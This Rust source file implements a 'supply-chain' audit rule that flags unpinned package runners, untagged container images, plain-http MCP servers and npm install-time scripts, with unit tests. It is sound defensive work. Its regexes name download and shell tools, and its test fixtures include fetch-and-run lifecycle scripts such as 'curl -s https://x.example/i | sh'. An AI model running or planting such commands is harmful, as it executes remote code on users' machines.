// Ported from HarnessKit (crates/hk-core/src/auditor/rules/mcp.rs and plugin.rs, commit
// 9098728d22fd5c2ea6fb4864da19183b55cb33c4, Apache-2.0).
// Modified: unpinned detection understands scoped packages, `--from`/`-p` package flags, `pipx
// run`, `pnpm dlx`, `bun x` and `uv tool run`; docker images with `:latest`, no tag or no digest
// are flagged; remote MCP over `http://` (loopback excepted), `enableAllProjectMcpServers` and a
// package.json's lifecycle scripts are added; evidence is redacted.

//! Rule `supply-chain`: code fetched or enabled without a pin.

use std::sync::LazyLock;

use regex::Regex;
use serde_json::Value;

use super::mcp::{finding, json_line, servers, Server};
use crate::audit::input::{FileRole, InputFile};
use crate::audit::{AuditInput, AuditRule, Finding, Severity};

const RULE: &str = "supply-chain";

/// Scripts npm runs on install and uninstall, without anyone asking.
const LIFECYCLE: [&str; 6] = [
    "preinstall",
    "install",
    "postinstall",
    "prepare",
    "preuninstall",
    "postuninstall",
];

#[derive(Clone, Copy, PartialEq, Eq)]
enum Ecosystem {
    Npm,
    Python,
}

fn basename(command: &str) -> String {
    let name = command.rsplit(['/', '\\']).next().unwrap_or(command);
    let lower = name.to_ascii_lowercase();
    for ext in [".cmd", ".exe", ".bat"] {
        if let Some(stem) = lower.strip_suffix(ext) {
            return stem.to_owned();
        }
    }
    lower
}

/// A version with `min_parts` numeric parts and nothing that makes it a range.
fn is_exact_version(version: &str, min_parts: usize) -> bool {
    let core = version.split(['-', '+']).next().unwrap_or_default();
    let parts: Vec<&str> = core.split('.').collect();
    parts.len() >= min_parts
        && parts
            .iter()
            .all(|p| !p.is_empty() && p.bytes().all(|b| b.is_ascii_digit()))
}

/// Whether a package spec names an exact version: `pkg@1.2.3`, `@scope/pkg@1.2.3`, `pkg==1.2.3`.
fn is_pinned(spec: &str, eco: Ecosystem) -> bool {
    if spec.contains("://") {
        // A git or archive URL is pinned when it names a ref (`...repo.git@v1.2.3`).
        return spec
            .split_once("://")
            .and_then(|(_, rest)| rest.rsplit_once('@'))
            .is_some_and(|(_, r)| !r.is_empty() && !r.contains('/'));
    }
    if spec.starts_with('.') || spec.starts_with('/') || spec.starts_with('~') {
        return true; // a local path is not fetched
    }
    if eco == Ecosystem::Python {
        if let Some((_, v)) = spec.split_once("==") {
            return is_exact_version(v, 2);
        }
    }
    // The version comes after the last `@` that is not the scope's.
    let body = spec.strip_prefix('@').unwrap_or(spec);
    match body.rsplit_once('@') {
        Some((_, version)) => is_exact_version(version, if eco == Ecosystem::Npm { 3 } else { 2 }),
        None => false,
    }
}

/// The package runner a command is, and the arguments after the runner's own words.
fn runner<'a>(command: &str, args: &'a [String]) -> Option<(Ecosystem, &'a [String])> {
    let first = args.first().map(String::as_str);
    let second = args.get(1).map(String::as_str);
    match (basename(command).as_str(), first, second) {
        ("npx" | "bunx", ..) => Some((Ecosystem::Npm, args)),
        ("uvx", ..) => Some((Ecosystem::Python, args)),
        ("pipx", Some("run"), _) => Some((Ecosystem::Python, &args[1..])),
        ("pnpm" | "yarn", Some("dlx"), _) | ("bun", Some("x"), _) | ("npm", Some("exec"), _) => {
            Some((Ecosystem::Npm, &args[1..]))
        }
        ("uv", Some("tool"), Some("run")) => Some((Ecosystem::Python, &args[2..])),
        _ => None,
    }
}

/// Flags that take a value, so the value is not mistaken for the package.
fn takes_value(flag: &str, eco: Ecosystem) -> bool {
    match eco {
        Ecosystem::Npm => matches!(
            flag,
            "--registry" | "--cache" | "-c" | "--call" | "--userconfig" | "--prefix"
        ),
        Ecosystem::Python => matches!(
            flag,
            "--python"
                | "-p"
                | "--index-url"
                | "-i"
                | "--index"
                | "--with"
                | "--with-requirements"
                | "--env-file"
                | "--directory"
                | "--python-version"
        ),
    }
}

/// The packages a runner invocation fetches, and whether it passes `-y`/`--yes`.
fn packages(eco: Ecosystem, args: &[String]) -> (Vec<String>, bool) {
    let mut named = Vec::new();
    let mut first_positional = None;
    let mut yes = false;
    let mut i = 0;
    while i < args.len() {
        let arg = args[i].as_str();
        let package_flag = match eco {
            Ecosystem::Npm => ["-p", "--package"].contains(&arg),
            Ecosystem::Python => arg == "--from",
        };
        if package_flag {
            if let Some(v) = args.get(i + 1) {
                named.push(v.clone());
            }
            i += 2;
            continue;
        }
        if let Some((flag, v)) = arg.split_once('=').filter(|_| arg.starts_with('-')) {
            if matches!(flag, "--package" | "--from") {
                named.push(v.to_owned());
            }
        } else if arg == "-y" || arg == "--yes" {
            yes = true;
        } else if arg.starts_with('-') {
            if takes_value(arg, eco) {
                i += 1;
            }
        } else {
            first_positional = Some(arg.to_owned());
            break;
        }
        i += 1;
    }
    if named.is_empty() {
        named.extend(first_positional);
    }
    (named, yes)
}

/// The image of a `docker run`/`podman run` command line.
fn docker_image(args: &[String]) -> Option<&str> {
    const WITH_VALUE: [&str; 24] = [
        "-e",
        "--env",
        "-v",
        "--volume",
        "-p",
        "--publish",
        "--name",
        "--network",
        "--net",
        "-w",
        "--workdir",
        "-u",
        "--user",
        "--mount",
        "--env-file",
        "-l",
        "--label",
        "--entrypoint",
        "--platform",
        "--add-host",
        "--cap-add",
        "--device",
        "-m",
        "--memory",
    ];
    let run = args.iter().position(|a| a == "run")?;
    let mut rest = args[run + 1..].iter();
    while let Some(arg) = rest.next() {
        if arg.starts_with('-') {
            if !arg.contains('=') && WITH_VALUE.contains(&arg.as_str()) {
                rest.next();
            }
        } else {
            return Some(arg);
        }
    }
    None
}

/// Whether an image reference is pinned: a digest, or a tag other than `latest`.
fn image_pinned(image: &str) -> bool {
    if image.contains("@sha256:") {
        return true;
    }
    let last = image.rsplit('/').next().unwrap_or(image);
    last.split_once(':')
        .is_some_and(|(_, tag)| !tag.is_empty() && tag != "latest")
}

/// The host of an `http://` URL, without credentials or port.
fn http_host(url: &str) -> Option<&str> {
    let rest = url
        .trim()
        .get(..7)
        .filter(|p| p.eq_ignore_ascii_case("http://"))?;
    let after = &url.trim()[rest.len()..];
    let authority = after.split(['/', '?', '#']).next().unwrap_or_default();
    let host = authority.rsplit('@').next().unwrap_or(authority);
    if host.starts_with('[') {
        return host.split(']').next().map(|h| &h[1..]);
    }
    host.split(':').next()
}

fn is_loopback(host: &str) -> bool {
    let h = host.to_ascii_lowercase();
    h == "localhost" || h == "::1" || h.starts_with("127.") || h.ends_with(".localhost")
}

fn server_findings(server: &Server) -> Vec<Finding> {
    let mut out = Vec::new();
    let mut push = |message: String, evidence: &str| {
        out.push(finding(
            RULE,
            Severity::Medium,
            format!("Supply chain: {message}"),
            &server.label,
            None,
            evidence,
        ));
    };
    let line = server.command_line();
    if let Some((eco, args)) = runner(&server.command, &server.args) {
        let (pkgs, yes) = packages(eco, args);
        let runner_name = basename(&server.command);
        for pkg in pkgs.iter().filter(|p| !is_pinned(p, eco)) {
            let hint = match eco {
                Ecosystem::Npm => "pkg@1.2.3",
                Ecosystem::Python => "pkg==1.2.3",
            };
            let auto = if yes {
                "; -y installs it without asking"
            } else {
                ""
            };
            push(
                format!("{runner_name} runs `{pkg}` without a pinned version (use {hint}){auto}"),
                &line,
            );
        }
    }
    if matches!(basename(&server.command).as_str(), "docker" | "podman") {
        if let Some(image) = docker_image(&server.args) {
            if !image_pinned(image) {
                push(
                    format!("the container image `{image}` has no tag or uses :latest (pin a tag or digest)"),
                    &line,
                );
            }
        }
    }
    if let Some(host) = http_host(&server.url) {
        if !is_loopback(host) {
            push(
                format!("the remote MCP server `{host}` is reached over plain http://"),
                &server.url,
            );
        }
    }
    out
}

static DOWNLOAD: LazyLock<Option<Regex>> = LazyLock::new(|| {
    Regex::new(
        r"(?i)\b(?:curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod)\b|https?://|\bfetch\(",
    )
    .ok()
});

static RUNS_SHELL: LazyLock<Option<Regex>> = LazyLock::new(|| {
    Regex::new(
        r"(?i)(?:^|[\s;&|(`])(?:sh|bash|zsh|dash|ksh|pwsh|powershell|cmd)(?:\.exe)?(?:\s|$)|(?:^|[\s;&|(`])eval(?:\s|$)",
    )
    .ok()
});

fn lifecycle_findings(file: &InputFile) -> Vec<Finding> {
    let Ok(json) = serde_json::from_str::<Value>(&file.text) else {
        return Vec::new();
    };
    let Some(scripts) = json.get("scripts").and_then(Value::as_object) else {
        return Vec::new();
    };
    let matches =
        |re: &LazyLock<Option<Regex>>, s: &str| re.as_ref().is_some_and(|re| re.is_match(s));
    LIFECYCLE
        .iter()
        .filter_map(|name| Some((*name, scripts.get(*name)?.as_str()?)))
        .map(|(name, script)| {
            let download = matches(&DOWNLOAD, script);
            let shell = matches(&RUNS_SHELL, script);
            let (severity, detail) = match (download, shell) {
                (true, true) => (Severity::High, " and it downloads and runs a shell"),
                (true, false) => (Severity::High, " and it downloads code"),
                (false, true) => (Severity::High, " and it runs a shell"),
                (false, false) => (Severity::Medium, ""),
            };
            finding(
                RULE,
                severity,
                format!("Supply chain: the package.json `{name}` script runs on install{detail}"),
                &file.path,
                json_line(file, name),
                &format!("{name}: {script}"),
            )
        })
        .collect()
}

fn is_package_json(file: &InputFile) -> bool {
    file.role == FileRole::Json && file.path.rsplit('/').next() == Some("package.json")
}

fn settings_findings(file: &InputFile) -> Vec<Finding> {
    let enabled = serde_json::from_str::<Value>(&file.text)
        .ok()
        .and_then(|j| j.get("enableAllProjectMcpServers").and_then(Value::as_bool))
        == Some(true);
    if !enabled {
        return Vec::new();
    }
    vec![finding(
        RULE,
        Severity::Medium,
        "Supply chain: enableAllProjectMcpServers approves every MCP server a repository declares"
            .into(),
        &file.path,
        json_line(file, "enableAllProjectMcpServers"),
        "enableAllProjectMcpServers: true",
    )]
}

/// Packages run without a pinned version, container images without a tag, MCP servers over
/// plain http, project MCP servers approved wholesale, and install-time scripts.
pub(crate) struct SupplyChain;

impl AuditRule for SupplyChain {
    fn id(&self) -> &'static str {
        RULE
    }

    fn severity(&self) -> Severity {
        Severity::Medium
    }

    fn check(&self, input: &AuditInput) -> Vec<Finding> {
        let mut out = Vec::new();
        for file in &input.files {
            for server in servers(file) {
                out.extend(server_findings(&server));
            }
            if file.is_settings() {
                out.extend(settings_findings(file));
            }
            if is_package_json(file) {
                out.extend(lifecycle_findings(file));
            }
        }
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::artifact::ArtifactKind;

    fn mcp(json: &str) -> Vec<Finding> {
        let input = AuditInput::with_files(
            ArtifactKind::Mcp,
            "db",
            ".mcp.json#db",
            &[(".mcp.json", json)],
        );
        SupplyChain.check(&input)
    }

    fn package(json: &str) -> Vec<Finding> {
        let input = AuditInput::with_files(
            ArtifactKind::Plugin,
            "p",
            "plugins/p",
            &[("plugins/p/package.json", json)],
        );
        SupplyChain.check(&input)
    }

    fn settings(json: &str) -> Vec<Finding> {
        let input = AuditInput::with_files(
            ArtifactKind::Settings,
            "settings",
            ".claude/settings.json",
            &[(".claude/settings.json", json)],
        );
        SupplyChain.check(&input)
    }

    #[test]
    fn unpinned_packages_trigger() {
        for json in [
            r#"{"command":"npx","args":["some-mcp"]}"#,
            r#"{"command":"npx","args":["-y","some-mcp@latest"]}"#,
            r#"{"command":"npx","args":["some-mcp@^1.2.3"]}"#,
            r#"{"command":"npx","args":["some-mcp@1"]}"#,
            r#"{"command":"npx","args":["@scope/pkg"]}"#,
            r#"{"command":"npx","args":["@scope/pkg@latest"]}"#,
            r#"{"command":"bunx","args":["some-mcp"]}"#,
            r#"{"command":"uvx","args":["some-mcp"]}"#,
            r#"{"command":"uvx","args":["some-mcp>=1.0"]}"#,
            r#"{"command":"pipx","args":["run","some-mcp"]}"#,
            r#"{"command":"pnpm","args":["dlx","some-mcp"]}"#,
            r#"{"command":"uvx","args":["--from","some-mcp","tool"]}"#,
            r#"{"command":"/usr/bin/npx","args":["some-mcp"]}"#,
        ] {
            let f = mcp(json);
            assert_eq!(f.len(), 1, "{json}");
            assert_eq!(f[0].rule, "supply-chain");
            assert_eq!(f[0].severity, Severity::Medium);
            assert_eq!(f[0].file, ".mcp.json");
        }
    }

    #[test]
    fn pinned_packages_pass() {
        for json in [
            r#"{"command":"npx","args":["some-mcp@1.2.3"]}"#,
            r#"{"command":"npx","args":["-y","some-mcp@1.2.3","--flag"]}"#,
            r#"{"command":"npx","args":["@scope/pkg@1.2.3"]}"#,
            r#"{"command":"npx","args":["@scope/pkg@1.2.3-beta.1"]}"#,
            r#"{"command":"uvx","args":["some-mcp==1.2.3"]}"#,
            r#"{"command":"uvx","args":["some-mcp@1.2.3"]}"#,
            r#"{"command":"uvx","args":["--from","some-mcp==1.2.3","tool"]}"#,
            r#"{"command":"npx","args":["./local-server"]}"#,
            r#"{"command":"node","args":["server.js"]}"#,
        ] {
            assert!(mcp(json).is_empty(), "{json}");
        }
    }

    #[test]
    fn scoped_unpinned_does_not_pass_even_though_it_has_an_at() {
        assert_eq!(mcp(r#"{"command":"npx","args":["@scope/pkg"]}"#).len(), 1);
    }

    #[test]
    fn auto_install_is_noted_in_the_message() {
        let yes = mcp(r#"{"command":"npx","args":["-y","some-mcp"]}"#);
        assert!(yes[0].message.contains("-y installs it without asking"));
        let long = mcp(r#"{"command":"npx","args":["--yes","some-mcp"]}"#);
        assert!(long[0].message.contains("without asking"));
        let ask = mcp(r#"{"command":"npx","args":["some-mcp"]}"#);
        assert!(!ask[0].message.contains("without asking"));
    }

    #[test]
    fn package_flags_are_read() {
        let f = mcp(r#"{"command":"npx","args":["-p","a@1.0.0","-p","b","cmd"]}"#);
        assert_eq!(f.len(), 1);
        assert!(f[0].message.contains("`b`"));
        // A value flag's value is not the package.
        assert!(
            mcp(r#"{"command":"npx","args":["--registry","https://r.example","pkg@1.2.3"]}"#)
                .is_empty()
        );
    }

    #[test]
    fn docker_latest_and_untagged_trigger_tagged_and_digest_pass() {
        for json in [
            r#"{"command":"docker","args":["run","-i","--rm","ghcr.io/org/mcp"]}"#,
            r#"{"command":"docker","args":["run","-i","--rm","org/mcp:latest"]}"#,
            r#"{"command":"docker","args":["run","-e","K","-v","/a:/b","org/mcp"]}"#,
        ] {
            let f = mcp(json);
            assert_eq!(f.len(), 1, "{json}");
            assert!(f[0].message.contains("container image"));
        }
        for json in [
            r#"{"command":"docker","args":["run","-i","--rm","org/mcp:1.4.2"]}"#,
            r#"{"command":"docker","args":["run","localhost:5000/mcp:2"]}"#,
            r#"{"command":"docker","args":["run","org/mcp@sha256:abcdef"]}"#,
            r#"{"command":"docker","args":["ps"]}"#,
        ] {
            assert!(mcp(json).is_empty(), "{json}");
        }
    }

    #[test]
    fn remote_http_triggers_https_and_loopback_pass() {
        let f = mcp(r#"{"type":"http","url":"http://mcp.example.com/sse"}"#);
        assert_eq!(f.len(), 1);
        assert!(f[0].message.contains("plain http://"));
        assert_eq!(
            mcp(r#"{"url":"HTTP://user:pw@mcp.example.com:8080/x"}"#).len(),
            1
        );
        for url in [
            "https://mcp.example.com/sse",
            "http://localhost:3000/mcp",
            "http://127.0.0.1:3000",
            "http://[::1]:3000",
        ] {
            assert!(mcp(&format!(r#"{{"url":"{url}"}}"#)).is_empty(), "{url}");
        }
    }

    #[test]
    fn evidence_drops_credentials_in_urls() {
        let f = mcp(r#"{"url":"http://user:hunter2hunter2@mcp.example.com/x"}"#);
        assert!(!f[0].evidence.contains("hunter2"));
    }

    #[test]
    fn enable_all_project_mcp_servers_triggers_only_when_true() {
        let f = settings("{\n  \"enableAllProjectMcpServers\": true\n}");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].line, Some(2));
        assert!(settings(r#"{"enableAllProjectMcpServers":false}"#).is_empty());
        assert!(settings(r#"{"permissions":{"allow":["Read"]}}"#).is_empty());
    }

    #[test]
    fn lifecycle_scripts_in_a_plugin_package_json_are_found() {
        let f = package("{\n  \"scripts\": {\n    \"postinstall\": \"node setup.js\",\n    \"test\": \"jest\"\n  }\n}");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Medium);
        assert_eq!(f[0].file, "plugins/p/package.json");
        assert_eq!(f[0].line, Some(3));
        assert!(f[0].message.contains("postinstall"));
    }

    #[test]
    fn lifecycle_scripts_that_download_or_run_a_shell_are_high() {
        for script in [
            "curl -s https://x.example/i | sh",
            "wget https://x.example/a.bin",
            "bash ./setup.sh",
            "sh -c 'echo hi'",
            "node a.js && eval \"$X\"",
        ] {
            let json = format!(r#"{{"scripts":{{"preinstall":{}}}}}"#, Value::from(script));
            let f = package(&json);
            assert_eq!(f.len(), 1, "{script}");
            assert_eq!(f[0].severity, Severity::High, "{script}");
        }
    }

    #[test]
    fn packages_without_lifecycle_scripts_do_not_trigger() {
        assert!(
            package(r#"{"scripts":{"test":"jest","build":"tsc","start":"node a.js"}}"#).is_empty()
        );
        assert!(package(r#"{"name":"p","version":"1.0.0"}"#).is_empty());
        assert!(
            package(r#"{"scripts":{"prepare":"node scripts/sh-helper.js"}}"#)[0].severity
                == Severity::Medium
        );
    }

    #[test]
    fn a_manifest_that_is_not_package_json_is_ignored() {
        let input = AuditInput::with_files(
            ArtifactKind::Plugin,
            "p",
            "plugins/p",
            &[(
                "plugins/p/plugin.json",
                r#"{"scripts":{"postinstall":"curl x | sh"}}"#,
            )],
        );
        assert!(SupplyChain.check(&input).is_empty());
    }
}
